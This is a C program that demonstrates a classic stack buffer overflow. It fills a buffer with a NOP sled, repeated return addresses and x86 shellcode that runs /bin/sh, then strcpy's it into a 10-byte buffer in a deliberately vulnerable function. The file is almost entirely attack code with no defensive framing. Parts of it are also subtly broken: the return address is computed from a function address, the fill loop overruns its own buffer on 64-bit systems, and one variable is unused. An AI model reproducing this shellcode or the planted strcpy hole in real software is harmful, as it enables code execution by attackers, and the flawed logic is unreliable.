#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define OFFSET 100
#define NOP 0x90
#define SHELLCODE "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

// Declare the exploitable function before main
int exploitable(char *arg);

int main(int argc, char **argv) {
    char buffer[256];
    char *ptr;
    long *addr_ptr, addr;
    int offset = OFFSET;
    int bsize = sizeof(buffer);
    int i;
    char *shell[2];
    shell[0] = "/bin/sh";
    shell[1] = NULL;

    if (argc > 1) offset = atoi(argv[1]);

    addr = (long)exploitable; // Get address of exploitable function
    printf("Address of exploitable() function: 0x%lx\n", addr);

    ptr = buffer;
    addr_ptr = (long *)(ptr);

    // Fill buffer with return address
    for (i = 0; i < bsize; i += 4) {
        *(addr_ptr++) = addr + offset;
    }

    // Fill buffer with NOPs
    for (i = 0; i < bsize/2; i++) {
        buffer[i] = NOP;
    }

    // Copy shellcode to buffer
    memcpy(buffer + (bsize/2), SHELLCODE, strlen(SHELLCODE));

    // Null terminate the buffer
    buffer[bsize - 1] = '\0';

    // Pass buffer to exploitable function
    exploitable(buffer);

    return 0;
}

int exploitable(char *arg) {
    // Make some stack space
    char buffer[10];
    // Now copy the buffer
    strcpy(buffer, arg);
    printf("The buffer says .. [%s/%p].\n", buffer, &buffer);
    // Return: everything fun
    return 0;
}